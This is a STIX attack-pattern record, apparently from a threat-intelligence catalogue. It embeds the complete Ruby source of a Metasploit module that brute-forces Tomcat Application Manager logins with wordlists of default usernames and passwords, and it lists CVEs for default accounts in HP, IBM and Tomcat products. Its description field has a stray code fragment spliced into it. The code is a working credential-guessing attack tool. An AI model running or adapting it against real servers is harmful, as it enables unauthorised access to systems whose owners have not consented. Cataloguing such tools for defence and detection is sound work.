{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--642dd7fe-99d7-48d1-8348-1cdae2a470fc",
    "created": "2024-08-14T16:30:52.164071Z",
    "modified": "2024-08-14T16:30:52.164074Z",
    "name": "Tomcat Application Manager Login Utility",
    "description": "This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass. 'References'     => [ # HP Default Operations Manager user/pass",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/tomcat_mgr_login.rb",
            "external_id": "tomcat_mgr_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4189"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20091129092955/http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4188"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0557"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21419179"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4094"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3548"
        },
        {
            "source_name": "reference",
            "url": "https://tomcat.apache.org/"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/tomcat'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Tomcat Application Manager Login Utility',\n      'Description'    => 'This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.',\n      'References'     =>\n        [\n          # HP Default Operations Manager user/pass\n          [ 'CVE', '2009-3843' ],\n          [ 'OSVDB', '60317' ],\n          [ 'BID', '37086' ],\n          [ 'CVE', '2009-4189' ],\n          [ 'OSVDB', '60670' ],\n          [ 'URL', 'https://web.archive.org/web/20091129092955/http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html' ],\n          [ 'ZDI', '09-085' ],\n\n          # HP Default Operations Dashboard user/pass\n          [ 'CVE', '2009-4188' ],\n\n          # IBM Cognos Express Default user/pass\n          [ 'BID', '38084' ],\n          [ 'CVE', '2010-0557' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179' ],\n\n          # IBM Rational Quality Manager and Test Lab Manager\n          [ 'CVE', '2010-4094' ],\n          [ 'ZDI', '10-214' ],\n\n          # 'admin' password is blank in default Windows installer\n          [ 'CVE', '2009-3548' ],\n          [ 'OSVDB', '60176' ],\n          [ 'BID', '36954' ],\n\n          # General\n          [ 'URL', 'https://tomcat.apache.org/' ],\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'Author'         => [ 'MC', 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('USERNAME', [false, 'The HTTP username to specify for authentication', '']),\n        OptString.new('PASSWORD', [false, 'The HTTP password to specify for authentication', '']),\n        OptString.new('TARGETURI', [true, \"URI for Manager login. Default is /manager/html\", \"/manager/html\"]),\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"tomcat_mgr_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"tomcat_mgr_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"tomcat_mgr_default_pass.txt\") ]),\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n\n    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888, 9080, 19300 ])\n  end\n\n  def run_host(ip)\n    begin\n      uri = normalize_uri(target_uri.path)\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => 'GET',\n        'username' => Rex::Text.rand_text_alpha(8)\n        }, 25)\n      http_fingerprint({ :response => res })\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"http://#{rhost}:#{rport}#{uri} - #{e}\")\n      return\n    end\n\n    if not res\n      vprint_error(\"http://#{rhost}:#{rport}#{uri} - No response\")\n      return\n    end\n    if res.code != 401\n      vprint_error(\"http://#{rhost}:#{rport}#{uri} - Authorization not requested\")\n      return\n    end\n\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::Tomcat.new(\n      configure_http_login_scanner(\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 10,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id,\n          private_type: :password\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        if result.proof\n          vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n        else\n          vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ MC",
        "Matteo Cantoni <goony[at]nothink.org>",
        "jduck ]",
        ""
    ]
}